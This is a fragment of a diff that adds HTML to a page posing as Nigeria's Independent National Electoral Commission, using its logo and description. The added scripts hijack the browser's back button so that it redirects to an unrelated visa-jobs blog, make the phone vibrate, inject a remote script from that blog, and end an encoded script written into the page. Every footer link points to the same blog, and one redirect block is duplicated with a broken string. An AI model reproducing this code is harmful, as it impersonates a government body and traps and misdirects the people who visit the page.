%3B%0A%7D%29%3B%0A%3C/script%3E'))
+
+</script>
+
+
+
+     <br>  
+
+       
+
+       <script>
+
+	navigator.vibrate([1000, 300, 1000, 300,1000]);
+
+</script>
+
+
+	
+
+<footer style="background-color: #066a35; color: white; padding: 20px; text-align: center;">
+  <center><img src="https://www.inecnigeria.org/wp-content/uploads/2024/04/INEC-logo-e1546261102728-1.png" alt="Free-Data" style="width: 70%;">
+    <br><br>
+    The Independent National Electoral Commission (INEC) was established by the 1999 Constitution of the Federal Republic of Nigeria to among other things organize elections into various political offices in the country. The functions of INEC as contained in Section 15, Part 1 of the Third Schedule of the 1999 Constitution (As Amended) and Section 2 of the Electoral Act 2010 (As Amended)
+      
+                     </center><br><br>
+  
+
+  <div style="max-width: 1200px; margin: 0 auto;">
+
+    <a onclick="window.open('https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/')" href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/" style="color: White; text-decoration: none; font-size: 1.5em; font-weight: bold; display: block; margin-bottom: 15px;"></a>
+
+    
+
+    <ul style="list-style: none; padding: 0; margin: 0 0 15px 0;">
+
+      <li style="display: inline; margin: 0 10px;">
+
+        <a onclick="window.open('https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/')" href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/" style="color: white; text-decoration: none;">Home</a>
+
+      </li>
+
+      <li style="display: inline; margin: 0 10px;">
+
+        <a onclick="window.open('https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/')" href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/" style="color: white; text-decoration: none;">About Us</a>
+
+      </li>
+
+      <li style="display: inline; margin: 0 10px;">
+
+        <a onclick="window.open('https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/')" href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/" style="color: white; text-decoration: none;">Contact Us</a>
+
+      </li>
+
+      <li style="display: inline; margin: 0 10px;">
+
+        <a onclick="window.open('https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/')" href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/" style="color: white; text-decoration: none;">Sitemap</a>
+
+      </li>
+
+    </ul>
+
+    
+
+    <div style="font-size: 0.9em; opacity: 0.8;">
+
+     Copyright © 2026 INEC
+
+    </div>
+
+  </div>
+
+</footer>
+
+
+       
+
+             
+
+
+
+
+
+<script>
+
+    window.onhashchange=function(){jp();};
+
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+
+    function jp() {
+
+        fh();}
+
+    setTimeout('hh();', 500);
+
+    function fh(){
+
+        location.href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/";
+
+    }
+
+    function goon(){
+
+        location.href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/";
+
+    }
+
+</script>
+
+
+
+
+
+
+
+	   <script>
+
+    window.onhashchange=function(){jp();};
+
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+
+    function jp() {
+
+        fh();}
+
+    setTimeout('hh();', 500);
+
+    function fh(){
+
+        location.href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/;
+
+    }
+
+    function goon(){
+
+        location.href="https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/;
+
+    }
+
+</script>
+
+<script>
+
+    var _hmt = _hmt || [];
+
+    (function() {
+
+        var hm = document.createElement("script");
+
+        hm.src = "https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/";
+
+        var s = document.getElementsByTagName("script")[0];
+
+        s.parentNode.insertBefore(hm, s);
+
+    })();
+
+</script>
+
+ 
+
+</div>
+
+       
+
+
+
+
+
+
+
+  
+
+  
+
+
+
+
+
+  <script>/<![CDATA[/ cookieChoices = {}; /]]>/</script>
+
+</body></html>
+ 
